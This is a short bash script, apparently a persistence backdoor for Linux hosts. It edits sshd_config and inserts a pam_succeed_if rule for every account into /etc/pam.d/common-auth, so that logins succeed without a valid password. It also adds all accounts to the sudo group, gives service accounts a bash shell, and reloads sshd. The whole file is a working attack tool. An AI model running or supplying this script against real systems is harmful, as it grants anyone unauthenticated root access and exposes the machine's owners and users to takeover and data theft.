#!/bin/bash
#script to just make every account authenticatable using PAM

#change password auth off for ssh and change to KbdInteractiveAuthentication
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/KbdInteractiveAuthentication no/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config

#modify the pam.d common-auth file adding every single user to auto authenticate (lol)
#also add them to the sudo group (works on ubuntu idk about other distros)
count=2
awk -F: '{ print $1}' /etc/passwd | while read line; 
do 
    sed -i "/# here are the per-package modules/aauth [success=$count default=ignore] pam_succeed_if.so user = $line" /etc/pam.d/common-auth
    adduser $line sudo
    ((count++))
done

#change all no shell logins to bash so every single account is usable
sed -i 's|/usr/bin/nologin|/bin/bash|' /etc/passwd
sed -i 's|/usr/sbin/nologin|/bin/bash|' /etc/passwd
sed -i 's|/bin/false|/bin/bash|' /etc/passwd

#reload sshd
systemctl reload sshd